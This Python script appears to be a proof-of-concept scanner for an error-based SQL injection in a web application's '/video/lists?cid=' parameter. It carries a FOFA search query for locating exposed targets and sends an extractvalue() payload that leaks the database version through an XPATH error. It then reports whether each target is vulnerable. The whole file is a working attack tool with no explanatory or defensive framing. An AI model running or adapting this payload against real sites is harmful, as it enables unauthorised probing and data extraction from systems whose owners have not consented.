#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
import re


def title():
    print('+          FOFA:"images/lists?cid"')


def run_proto(url):
    con_list = [
        "/video/lists?cid=13 ) AND extractvalue(rand(),concat(CHAR(126),(version()),CHAR(126)))--%20"]
    for con in con_list:
        vuln_url = url + con
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            session = requests.session()
            session.trust_env = False
            # session.get(url=url, verify=False, headers=headers, timeout=(3, 3))
            resp = session.post(url=vuln_url, verify=False, headers=headers, proxies=None, timeout=(3, 3))
            re_resp = re.search('XPATH.*?syntax.*?error', resp.text, re.I | re.M)
            if re_resp:
                print(url)
                print(resp.text)
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1:8080')
    args = parse.parse_args()
    targ = args.url
    result = run(targ)

    if result:
        print('Exist')
    else:
        print('UnExist')